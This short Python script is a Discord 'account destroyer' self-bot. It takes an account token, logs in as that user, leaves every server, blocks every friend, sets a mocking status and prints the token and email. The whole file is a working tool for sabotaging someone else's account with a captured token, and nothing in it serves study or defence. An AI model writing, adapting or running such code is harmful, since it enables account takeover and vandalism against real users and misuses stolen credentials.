import discord
from discord.ext import commands 
import os

def clear():
	if os.name != 'nt':
		os.system('clear')
	else:
		os.system('cls')

client = commands.Bot(command_prefix='')

token = input('Enter token to destroy: ')



@client.event 
async def on_connect():
	game = discord.Game(
        name='account fucked by github.com/kyliex/accountfucker'
    )
	await client.change_presence(activity=game)
	for guild in client.guilds:
		try:
			await guild.leave()
			print('Successfully left ' + guild.name)
		except:
			print('Failed to leave ' + guild.name)
			pass
	for friend in client.user.friends:
		try:
			await friend.block()
			print('Blocked ' + str(friend))
		except Exception as e:
			print('Failed to block ' + str(friend) + '. The reason is ' + str(e))
	clear()
	print('Discord account successfully destroyed!')
	print('Token: ' + token)
	print('Email: ' + client.user.email)

@client.event
async def on_command_error(ctx, error):
	pass

client.run(token, bot=False)